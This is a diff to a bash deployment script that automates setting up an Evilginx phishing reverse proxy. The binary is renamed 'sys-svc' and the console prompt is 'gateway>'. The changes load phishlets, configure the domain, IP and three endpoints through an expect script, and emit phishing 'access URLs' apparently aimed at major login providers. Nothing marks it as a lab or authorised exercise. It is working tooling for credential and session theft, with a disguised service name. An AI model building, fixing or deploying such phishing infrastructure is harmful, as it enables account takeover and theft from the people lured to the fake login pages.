@@ -290,6 +290,8 @@ phase_deploy_resources() {
     
     success "Resources deployed"
     log "  Endpoint 1: $EP1.$DOMAIN"
+    log "  Endpoint 2: $EP2.$DOMAIN"
+    log "  Endpoint 3: $EP3.$DOMAIN"
 }
 
 # ============================================================================
@@ -299,7 +301,7 @@ phase_config() {
     log "Creating configuration..."
     
     cat > "$APP_DIR/config/config.yaml" << EOF
-daemon: false
+daemon: true
 debug: false
 domain: $DOMAIN
 ipv4: $VPS_IP
@@ -482,6 +484,10 @@ EOF
 # ============================================================================
 phase_generate_urls() {
     log "Configuring service and generating access URLs..."
+    info "Starting interactive configuration (this may take up to 60 seconds)..."
+    
+    # Temporarily disable daemon mode so expect can interact with the console
+    sed -i "s/daemon: true/daemon: false/" "$APP_DIR/config/config.yaml"
     
     EP1=$(cat "$APP_DIR/.ep1")
     EP2=$(cat "$APP_DIR/.ep2")
@@ -490,9 +496,9 @@ phase_generate_urls() {
     # Create expect script for automatic configuration
     cat > /tmp/configure.exp << 'EOF'
 #!/usr/bin/expect -f
-set timeout 30
+set timeout 60
 log_user 0
-spawn /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets
+spawn /usr/local/bin/sys-svc -c $env(APP_DIR)/config -p $env(APP_DIR)/phishlets
 
 expect "gateway>" { send "config domain $env(DOMAIN)\r" }
 expect "gateway>" { send "config ipv4 external $env(VPS_IP)\r" }
@@ -530,13 +536,20 @@ expect eof
 EOF
 
     chmod +x /tmp/configure.exp
-    export DOMAIN VPS_IP EP1 EP2 EP3
+    export DOMAIN VPS_IP EP1 EP2 EP3 APP_DIR
     output=$(/tmp/configure.exp 2>/dev/null)
     rm -f /tmp/configure.exp
+
+    # Re-enable daemon mode for the background service
+    sed -i "s/daemon: false/daemon: true/" "$APP_DIR/config/config.yaml"
     
     Y_URL=$(echo "$output" | grep "Y_URL=" | cut -d'=' -f2-)
     M_URL=$(echo "$output" | grep "M_URL=" | cut -d'=' -f2-)
     G_URL=$(echo "$output" | grep "G_URL=" | cut -d'=' -f2-)
+
+    if [[ -z "$Y_URL" || -z "$M_URL" || -z "$G_URL" ]]; then
+        error "Failed to generate all access URLs. Check Evilginx console output for errors."
+    fi
     
     cat > "$APP_DIR/access_urls.txt" << EOF
 ========================================
@@ -614,8 +627,8 @@ main() {
     phase_deploy_resources
     phase_config
     phase_notifications
-    phase_service
     phase_generate_urls
+    phase_service
     print_summary
 }
 
